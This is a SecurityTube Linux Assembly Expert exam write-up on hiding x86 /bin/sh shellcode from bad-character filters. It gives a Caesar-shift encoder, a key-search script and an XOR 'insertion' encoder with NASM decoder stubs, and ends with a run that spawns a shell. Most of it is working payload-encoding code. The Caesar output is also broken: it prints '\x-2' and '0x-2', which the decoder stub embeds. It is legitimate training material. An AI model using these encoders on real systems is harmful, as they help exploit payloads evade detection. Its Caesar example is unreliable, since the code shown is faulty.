# Note

This MD file has been created for the SecurityTube Linux Assembly Expert certification (https://www.pentesteracademy.com/course?id=3). Student ID: 1483.

# Ceasar encoder

Before using *insertion encoder* technique, lets explain a encoder developped in order to :
 * encode shellcode
 * try to avoid bad characters.
 
 Ceasar encryption scheme is used as base. Wikipedia has a very good explaination of this cyper: https://en.wikipedia.org/wiki/Caesar_cipher.
 
## Using a 13 left shift
 
 First step is to encode the shellcode using the Python example script for XOR decoder:
 
 ```python
 #!/usr/bin/python3
# Python Cesar Encoder 


##Cesar encoder/decoced

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print('Encoded shellcode ...')

for x in shellcode:
	# Cesar Encoding 	
	y = ord(x) - 0xD
	encoded += '\\x'
	encoded += '%02x' % y

	encoded2 += '0x'
	encoded2 += '%02x,' %y


print(encoded)
print(encoded2[:-1])
print('Len: %d' % len(shellcode))
 ```

This Python script returns the encoded shellcode:

```
$ python3 CESAREncoder.py 
Encoded shellcode ...
\x24\xb3\x43\x5b\x22\x22\x66\x5b\x5b\x22\x55\x5c\x61\x7c\xd6\x43\x7c\xd5\x46\x7c\xd4\xa3\x-2\xc0\x73
0x24,0xb3,0x43,0x5b,0x22,0x22,0x66,0x5b,0x5b,0x22,0x55,0x5c,0x61,0x7c,0xd6,0x43,0x7c,0xd5,0x46,0x7c,0xd4,0xa3,0x-2,0xc0,0x73
Len: 25
```

Then by simply editing *XOR-Decoder.nasm* example file, a decoder can be written:
  
```ASM
global _start			

section .text
_start:
	jmp short call_decoder

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25

decode:
	add byte [esi], 13
	inc esi
	loop decode
	jmp short Shellcode

call_decoder:
	call decoder
	Shellcode: db 0x24,0xb3,0x43,0x5b,0x22,0x22,0x66,0x5b,0x5b,0x22,0x55,0x5c,0x61,0x7c,0xd6,0x43,0x7c,0xd5,0x46,0x7c,0xd4,0xa3,0x-2,0xc0,0x73
 ```
 ## Cesar encoder/decoder script for avoiding forbiden chars
 
Next step will be to try every possible keys in order to find a encoded shellcode without forbiden chars. Script must handle the char use by the ASM decoder. The following Python 3 script took a shellcode and badchars and return, if possible an encoded shellcode with the decoder.

The script also check if the forbiden chars are present in the decoder stub.

```python
 #!/usr/bin/python3
 #Python Cesar Encoder 

import sys

shellcode_decoder = "global _start\n\
\n\
section .text\n\
_start:\n\
	jmp short call_decoder\n\
\n\
decoder:\n\
	pop esi\n\
	xor ecx, ecx\n\
	mov cl, %SIZE%\n\
\n\
decode:\n\
	add byte [esi], %CESAR%\n\
	inc esi\n\
	loop decode\n\
	jmp short Shellcode\n\
\n\
call_decoder:\n\
	call decoder\n\
	Shellcode: db %ENCODED%"

badchars = [0x00]
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

known_chars = [0xeb, 0x0d, 0x5e, 0x31, 0xc9, 0xb1, 0x19, 0x80, 0x06, 0x46, 0xe2, 0xfa, 0xeb, 0x05, 0xe8, 0xee, 0xff, 0xfe, 0x06, 0x0e]
for elmt in badchars:
   if elmt in known_chars:
      print("One or more badchars is present in the decoder stub")
      sys.exit(1)
"""
 8048080:	eb 0d                	jmp    804808f <call_decoder>

08048082 <decoder>:
 8048082:	5e                   	pop    esi
 8048083:	31 c9                	xor    ecx,ecx
 8048085:	b1 19                	mov    cl,0x19

08048087 <decode>:
 8048087:	80 06 0d             	add    BYTE PTR [esi],0xd
 804808a:	46                   	inc    esi
 804808b:	e2 fa                	loop   8048087 <decode>
 804808d:	eb 05                	jmp    8048094 <Shellcode>

0804808f <call_decoder>:
 804808f:	e8 ee ff ff ff 

   0:	fe 06                	inc    BYTE PTR [esi]
   2:	fe 0e                	dec    BYTE PTR [esi]
"""

for i in range(1, 0xFF):
   if i in badchars:
      break
   encoded = ""
   encoded2 = ""
   for x in shellcode :
      # Cesar Encoding 	
      y = ord(x) - i
      if y in badchars:
         break

      encoded += '\\x'
      encoded += '%02x' % y

      encoded2 += '0x'
      encoded2 += '%02x,' %y

   if len(encoded) == len(shellcode) * 4:
      break


shellcode_decoder = shellcode_decoder.replace("%SIZE%",  str(len(shellcode)))
shellcode_decoder = shellcode_decoder.replace("%ENCODED%", encoded2[:-1])
if i == 1:
   shellcode_decoder = shellcode_decoder.replace("add byte [esi], %CESAR%", "INC byte [esi]")
elif i == 0xFE:
   shellcode_decoder = shellcode_decoder.replace("add byte [esi], %CESAR%", "DEC byte [esi]")
else:
   shellcode_decoder = shellcode_decoder.replace("%CESAR%", str(i))

print(shellcode_decoder)
```

# Insertion decoder

No lets try an insertion encoder. The idea will be to:

- Take two bytes of the shellcode
- Reverse the order
- Generate a random value
- XOR each byte with the random value
- Insert the random number after the two reversed and xored bytes.

The new shellcode code (without the decoder stub) will be 1.5 longer.

## The encoder

If the shellcode length is not a multiple of two, the shellcode is padded with a NOP (0x90).

```python
#!/usr/bin/python3
import random

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
if len(shellcode) % 2 == 1:
   shellcode += "\x90"

encoded = ""
encoded2 = ""

print('Encoded shellcode ...')
for i in range(int(len(shellcode)/2)):  
   alea = random.randint(1, 255)
   x = ord(shellcode[2*i+1]) ^ alea
   y = ord(shellcode[2*i]) ^ alea

   encoded += '\\x%02x' % x
   encoded += '\\x%02x' % y
   encoded += '\\x%02x' % alea

   encoded2 += '0x'
   encoded2 += '%02x,'  % x
   encoded2 += '0x'
   encoded2 += '%02x,'  % y
   encoded2 += '0x%02x,' % alea

print(encoded)
print(encoded2[:-1])

print('Len: %d' % (len(encoded)/4))
```

Let's generate an encoded shellcode:

```
$ python3 ACE-Insertion-Encoder.py 
Encoded shellcode ...
\x25\xd4\xe5\xee\xd6\x86\x0c\x0c\x23\x92\x89\xfa\x92\xd5\xbd\x2d\x26\x44\x35\xd2\xbc\xff\x4c\xaf\xf6\x9d\x14\x5e\x84\xd7\xc8\x99\x78\x55\x93\x98\x67\x77\xf7
0x25,0xd4,0xe5,0xee,0xd6,0x86,0x0c,0x0c,0x23,0x92,0x89,0xfa,0x92,0xd5,0xbd,0x2d,0x26,0x44,0x35,0xd2,0xbc,0xff,0x4c,0xaf,0xf6,0x9d,0x14,0x5e,0x84,0xd7,0xc8,0x99,0x78,0x55,0x93,0x98,0x67,0x77,0xf7
Len: 39
```

## The decoder

```ASM
global _start

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	xor eax, eax ;al for first byte
	cdq ;dl for XOR
	xor ebx, ebx ; bl for third byte
	xor ecx, ecx ; as a counter


decode:
	mov al, [esi+ecx]
	mov bl, [esi+ecx+1]
	mov dl, [esi+ecx+2]
	xor al, dl
	xor bl, dl
	mov byte [esi], bl
	mov byte [esi+1], al
	add esi, 2
	inc ecx
	cmp ecx, 13
	jz short EncodedShellcode
	jmp decode

call_shellcode:

	call decoder
	EncodedShellcode: db 0x25,0xd4,0xe5,0xee,0xd6,0x86,0x0c,0x0c,0x23,0x92,0x89,0xfa,0x92,0xd5,0xbd,0x2d,0x26,0x44,0x35,0xd2,0xbc,0xff,0x4c,0xaf,0xf6,0x9d,0x14,0x5e,0x84,0xd7,0xc8,0x99,0x78,0x55,0x93,0x98,0x67,0x77,0xf7
```

## Execution

Note: the *-N* option should not be forgottent in order to be able to write in the text segment.

```
cervoise@slae:~/exam/encoder$  nasm -f elf32 insertion-decoder.nasm &&  ld -N -o insertion-decoder insertion-decoder.o
cervoise@slae:~/exam/encoder$ ./insertion-decoder 
$ id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ exit
```
